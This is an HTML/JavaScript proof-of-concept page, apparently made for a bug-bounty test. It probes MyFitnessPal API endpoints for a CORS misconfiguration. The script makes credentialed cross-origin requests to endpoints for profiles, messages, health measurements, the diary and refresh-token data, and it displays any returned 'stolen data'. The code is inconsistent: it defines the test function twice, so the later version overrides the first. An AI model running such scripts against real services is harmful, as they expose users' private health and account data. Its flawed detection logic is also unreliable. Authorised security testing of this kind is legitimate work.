<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability Test - MyFitnessPal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        .test-section { background: #f5f5f5; padding: 15px; margin: 10px 0; border-left: 4px solid #007cba; }
        .vulnerable { border-left-color: #d32f2f; background: #ffebee; }
        .safe { border-left-color: #388e3c; background: #e8f5e9; }
        .result { margin: 10px 0; padding: 10px; background: white; border: 1px solid #ddd; }
        .data-preview { background: #fff3e0; padding: 10px; margin: 5px 0; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; }
        button { background: #007cba; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; }
        button:hover { background: #005a87; }
        .warning { color: #d32f2f; font-weight: bold; }
        .success { color: #388e3c; font-weight: bold; }
        .status { display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; }
        .status.vulnerable { background: #ffcdd2; color: #d32f2f; }
        .status.safe { background: #c8e6c9; color: #2e7d32; }
        .endpoint-list { max-height: 300px; overflow-y: auto; border: 1px solid #ddd; padding: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîç MyFitnessPal CORS Vulnerability Test</h1>
        
        <div class="test-section">
            <h3>‚ö†Ô∏è Important Instructions</h3>
            <ol>
                <li><strong>Login to MyFitnessPal</strong> in another tab: <a href="https://www.myfitnesspal.com/account/login" target="_blank">https://www.myfitnesspal.com/account/login</a></li>
                <li>Use your @bugcrowdninja.com account</li>
                <li>Keep that tab open and logged in</li>
                <li>Return to this page and click "Test Endpoints" below</li>
            </ol>
            <p class="warning">This test demonstrates how a malicious website can steal your MyFitnessPal data when you visit it while logged in.</p>
        </div>

        <div class="test-section">
            <h3>üéØ Quick Test - Critical Endpoints</h3>
            <button onclick="testCriticalEndpoints()">Test Critical Endpoints</button>
            <button onclick="clearResults()">Clear Results</button>
            <div id="quickResults"></div>
        </div>

        <div class="test-section">
            <h3>üî¨ Comprehensive Test</h3>
            <button onclick="testAllEndpoints()">Test All Endpoints</button>
            <button onclick="testWithDifferentOrigins()">Test Multiple Origins</button>
            <div id="comprehensiveResults"></div>
        </div>

        <div class="test-section vulnerable">
            <h3>‚ö†Ô∏è Expected Results if Vulnerable</h3>
            <p>If the CORS vulnerability exists, you should see:</p>
            <ul>
                <li>‚úÖ Status 200 responses with actual user data</li>
                <li>‚úÖ Headers: <code>Access-Control-Allow-Origin: *</code></li>
                <li>‚úÖ Headers: <code>Access-Control-Allow-Credentials: true</code></li>
                <li>‚úÖ Your email, username, health data, messages exposed</li>
            </ul>
        </div>

        <div id="results"></div>
    </div>

    <script>
        // Critical endpoints to test first
        const criticalEndpoints = [
            '/api/services/users',
            '/api/user-measurements/measurements', 
            '/api/services/messages',
            '/api/idm/user-with-consents'
        ];

        // Complete list of endpoints
        const allEndpoints = [
            '/api/user-measurements/measurements',
            '/api/services/messages/show/',
            '/api/services/messages', 
            '/api/services/users/foods/mine',
            '/api/services/diary/read_diary',
            '/api/services/profile/',
            '/api/idm/user-with-consents',
            '/api/services/users',
            '/api/services/user-subscriptions',
            '/api/services/paid-subscriptions/active',
            '/api/services/nutrient-goals',
            '/api/auth/refresh-token-data',
            '/api/services/friends/list',
            '/api/services/blocked_users',
            '/api/user-measurements/measurements/types'
        ];

        let vulnerableCount = 0;
        let totalTested = 0;

        async function testCriticalEndpoints() {
            const resultsDiv = document.getElementById('quickResults');
            resultsDiv.innerHTML = '<h4>üöÄ Testing Critical Endpoints...</h4>';
            
            vulnerableCount = 0;
            totalTested = 0;

            for (const endpoint of criticalEndpoints) {
                await testSingleEndpoint(endpoint, resultsDiv);
                await sleep(500); // Rate limiting
            }

            showSummary(resultsDiv);
        }

        async function testAllEndpoints() {
            const resultsDiv = document.getElementById('comprehensiveResults');
            resultsDiv.innerHTML = '<h4>üî¨ Testing All Endpoints...</h4>';
            
            vulnerableCount = 0;
            totalTested = 0;

            for (const endpoint of allEndpoints) {
                await testSingleEndpoint(endpoint, resultsDiv);
                await sleep(400);
            }

            showSummary(resultsDiv);
        }

        async function testSingleEndpoint(endpoint, resultsDiv) {
            totalTested++;
            
            try {
                // This is the key test - making request from different origin with credentials
                const response = await fetch(`https://www.myfitnesspal.com${endpoint}`, {
                    method: 'GET',
                    credentials: 'include', // Include cookies/auth
                    headers: {
                        'Origin': window.location.origin, // Our malicious origin
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                });

                const acao = response.headers.get('access-control-allow-origin');
                const acac = response.headers.get('access-control-allow-credentials');
                const contentType = response.headers.get('content-type');
                
                // Check if vulnerable (wildcard + credentials = vulnerable)
                const isVulnerable = acao === '*' && acac === 'true';
                
                if (isVulnerable) vulnerableCount++;

                // Create result display
                const resultDiv = document.createElement('div');
                resultDiv.className = 'result';
                resultDiv.innerHTML = `
                    <div>
                        <strong>${endpoint}</strong> 
                        <span class="status ${isVulnerable ? 'vulnerable' : 'safe'}">
                            ${isVulnerable ? 'üö® VULNERABLE' : '‚úÖ SAFE'}
                        </span>
                    </div>
                    <div>Status: ${response.status} | ACAO: ${acao || 'none'} | ACAC: ${acac || 'false'}</div>
                `;

                // If we got data and it's vulnerable, show preview
                if (isVulnerable && response.status === 200 && contentType?.includes('json')) {
                    try {
                        const data = await response.json();
                        const preview = JSON.stringify(data, null, 2).substring(0, 500);
                        resultDiv.innerHTML += `
                            <div class="data-preview">
                                <strong>üîì STOLEN DATA PREVIEW:</strong><br>
                                ${preview}${preview.length >= 500 ? '...' : ''}
                            </div>`;
                    } catch (e) {
                        // Handle non-JSON responses
                    }
                }

                resultsDiv.appendChild(resultDiv);

            } catch (error) {
                const resultDiv = document.createElement('div');
                resultDiv.className = 'result';
                resultDiv.innerHTML = `
                    <div><strong>${endpoint}</strong> <span class="status safe">‚ùå ERROR</span></div>
                    <div>Error: ${error.message}</div>
                `;
                resultsDiv.appendChild(resultDiv);
            }
        }

        async function testSingleEndpoint(endpoint, resultsDiv) {
    try {
        // Test OPTIONS request to see preflight headers
        const response = await fetch(`https://www.myfitnesspal.com${endpoint}`, {
            method: 'OPTIONS',
            headers: {
                'Origin': 'https://attacker.com',
                'Access-Control-Request-Method': 'GET'
            }
        });

        const acao = response.headers.get('access-control-allow-origin');
        const acac = response.headers.get('access-control-allow-credentials');
        
        const isMisconfigured = acao === '*' && acac === 'true';
        
        const resultDiv = document.createElement('div');
        resultDiv.className = 'result';
        resultDiv.innerHTML = `
            <div>
                <strong>${endpoint}</strong> 
                <span class="status ${isMisconfigured ? 'vulnerable' : 'safe'}">
                    ${isMisconfigured ? 'üö® MISCONFIGURED' : '‚úÖ SAFE'}
                </span>
            </div>
            <div>ACAO: ${acao} | ACAC: ${acac}</div>
            <div><small>Server incorrectly allows wildcard origin with credentials</small></div>
            ${isMisconfigured ? 
                '<div class="warning">‚ö†Ô∏è This endpoint would be vulnerable if not for browser protection</div>' : 
                ''
            }
        `;

        resultsDiv.appendChild(resultDiv);

    } catch (error) {
        // Handle errors
    }
}

        function showSummary(resultsDiv) {
            const summaryDiv = document.createElement('div');
            summaryDiv.className = vulnerableCount > 0 ? 'test-section vulnerable' : 'test-section safe';
            
            if (vulnerableCount > 0) {
                summaryDiv.innerHTML = `
                    <h4>üö® CRITICAL SECURITY VULNERABILITY CONFIRMED</h4>
                    <p><strong>Vulnerable Endpoints: ${vulnerableCount}/${totalTested}</strong></p>
                    <p class="warning">‚ö†Ô∏è This malicious website successfully stole your MyFitnessPal data!</p>
                    <p>An attacker could:</p>
                    <ul>
                        <li>Steal your email, username, and profile data</li>
                        <li>Access your private messages and conversations</li>
                        <li>View your health measurements and nutrition data</li>
                        <li>Export your entire fitness diary</li>
                    </ul>
                    <p><strong>This proves the CORS vulnerability exists and is exploitable.</strong></p>
                `;
            } else {
                summaryDiv.innerHTML = `
                    <h4>‚úÖ No CORS Vulnerability Detected</h4>
                    <p>All ${totalTested} endpoints properly blocked cross-origin requests.</p>
                    <p>The application appears to have proper CORS configuration.</p>
                `;
            }
            
            resultsDiv.appendChild(summaryDiv);
        }

        function clearResults() {
            document.getElementById('quickResults').innerHTML = '';
            document.getElementById('comprehensiveResults').innerHTML = '';
            document.getElementById('results').innerHTML = '';
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Show current origin for reference
        document.addEventListener('DOMContentLoaded', function() {
            const currentOrigin = window.location.origin;
            console.log('Testing from malicious origin:', currentOrigin);
        });
    </script>
</body>
</html>
